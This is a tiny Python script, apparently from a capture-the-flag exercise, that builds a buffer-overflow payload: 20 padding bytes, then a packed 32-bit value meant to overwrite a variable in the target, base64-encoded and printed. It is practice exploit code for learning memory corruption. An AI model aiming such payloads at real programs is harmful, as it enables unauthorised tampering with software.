
import sys
import struct
import base64

buf = b'qqqqqqqqqqqqqqqqqqqq'
buf += struct.pack('<I', 790725169)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
